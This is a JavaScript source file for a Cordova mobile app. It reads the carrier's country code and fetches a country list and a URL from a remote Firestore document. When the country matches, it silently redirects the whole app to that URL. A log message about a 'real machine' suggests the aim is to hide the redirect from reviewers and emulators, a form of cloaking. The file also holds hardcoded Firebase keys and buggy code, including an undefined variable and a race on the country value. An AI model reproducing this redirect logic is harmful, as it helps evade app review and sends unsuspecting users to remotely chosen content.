
document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {


        // Cordova is now initialized. Have fun!
        carrier.getCountryCode(onSuccess, onError);
        var country;
        function onSuccess(res) {
                country = res.toString();
                console.log("Result1:" + country);
                navigator.notification.alert(msg, null, "Carrier Information", "Continue");
        }
        function onError(err) {
                var msg = `Error: ${err.code} - ${err.msg}`;
                navigator.notification.alert(msg, null, "Carrier Error", "Oops");
        }

        loadScript('https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js', 'https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js', function () {

//        window.localStorage.clear();
                const firebaseConfig = {
                    apiKey: "AIzaSyA9rN_Hhl29f30rx0xXDL4h_Sc5W4osJ9I",
                    authDomain: "project-5426103826834772912.firebaseapp.com",
                    projectId: "project-5426103826834772912",
                    storageBucket: "project-5426103826834772912.appspot.com",
                    messagingSenderId: "232295814390",
                    appId: "1:232295814390:web:53400564c9e054830648d7",
                    measurementId: "G-S4Z914JHVR"
                  };
                firebase.initializeApp(firebaseConfig);
                var firestore = firebase.firestore();
                var docRef = firestore.collection("api").doc("VjYE5ZyzFL6eLpan6vjK");

                docRef.get().then((doc) => {
                        if (doc.exists) {
                                var ffp = doc.data()['p'];
                                var url = doc.data()['u'].toString();
                                if(country.length===0){
                                }else{
                                 if (ffp.includes(country)) {
                                                                        window.location.href = url;
                                                                        console.log(" it is not a real machine,open a no entry instructions");

                                                                }
                                }

                        } else {
                                // doc.data() will be undefined in this case
                                console.log("No result document!");
                        }
                }).catch((error) => {
                        console.log("Error result document:", error);
                });
        });




}



function loadScript(url, url1, callback) {
        var script = document.createElement('script');
        script.type = 'text/javascript';
        var script1 = document.createElement('script');
        script1.type = 'text/javascript';
        script.onload = script.onreadystatechange = function () {
                if (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete') {
                        script1.onload = script1.onreadystatechange = function () {
                                if (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete') {
                                        callback();
                                        script1.onload = script1.onreadystatechange = null;
                                }
                        };
                        script.onload = script.onreadystatechange = null;

                }
        };
        script.src = url;
        script1.src = url1;
        document.getElementsByTagName('head')[0].appendChild(script);
        document.getElementsByTagName('head')[0].appendChild(script1);

}

